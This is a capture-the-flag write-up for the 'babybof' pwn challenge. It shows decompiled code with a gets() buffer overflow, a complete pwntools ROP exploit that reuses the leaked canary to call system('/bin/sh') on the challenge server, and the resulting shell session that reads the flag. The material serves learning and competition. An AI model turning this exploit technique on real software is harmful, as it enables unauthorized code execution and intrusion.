# babybof

```
by Eth007
Description

welcome to pwn! hopefully you can do your first buffer overflow

nc babybof.chal.imaginaryctf.org 1337
Attachments

vuln
```

Attachment decompiled via [Binary Ninja](https://binary.ninja):

```c
004011bf    int32_t main(int32_t argc, char** argv, char** envp)

004011bf    {
004011bf        void* fsbase;
004011cb        int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
004011e9        setbuf(stdin, nullptr);
004011fd        setbuf(__TMC_END__, nullptr);
0040120c        puts("Welcome to babybof!");
0040121b        puts("Here is some helpful info:");
00401239        printf("system @ %p\n", system);
00401257        printf("pop rdi; ret @ %p\n", &data_4011ba);
00401275        printf("ret @ %p\n", &data_4011bb);
00401293        printf(""/bin/sh" @ %p\n", "/bin/sh");
004012b5        printf("canary: %p\n", rax);
004012c9        printf("enter your input (make sure your stack is aligned!): ");
004012da        char buf[0x38];
004012da        gets(&buf);
004012f5        printf("your input: %s\n", &buf);
00401317        printf("canary: %p\n", rax);
00401339        printf("return address: %p\n", __return_addr);
00401347        *(uint64_t*)((char*)fsbase + 0x28);
00401347        
00401350        if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401358            return 0;
00401358        
00401352        __stack_chk_fail();
00401352        /* no return */
004011bf    }
```

The program gives us all the values required for Return Oriented Programming. We just:

1. skip over 0x38 buffer
2. keep canary as it is
3. write anything for saved rbp
4. jump to `ret` to balance the stack
5. jump to `pop_rdi_ret` to set rdi to point to `/bin/sh`
6. jump to `system` to get shell

Attack script:

```python
from pwn import *

elf = ELF("./vuln")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(log_level = "debug")

# p = process("./vuln")
p = remote(host="babybof.chal.imaginaryctf.org", port=1337)
# gdb.attach(p)
# pause()
p.recvline() # required online
p.recvline()
p.recvline()
system = int(p.recvline().split()[-1], 16)
pop_rdi_ret = int(p.recvline().split()[-1], 16)
ret = int(p.recvline().split()[-1], 16)
bin_sh = int(p.recvline().split()[-1], 16)
canary = int(p.recvline().split()[-1], 16)
print(hex(system), hex(pop_rdi_ret), hex(ret), hex(bin_sh), hex(canary))
p.sendline(b"A" * 0x38 + p64(canary) + p64(0x0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system))
p.interactive()
```

Get shell:

```shell
your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
canary: 0x9806fa0ef482d300
return address: 0x4011bb
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xe bytes:
    b'chal\n'
    b'flag.txt\n'
chal
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x3c bytes:
    b'ictf{arent_challenges_written_two_hours_before_ctf_amazing}\n'
ictf{arent_challenges_written_two_hours_before_ctf_amazing}
$  
```
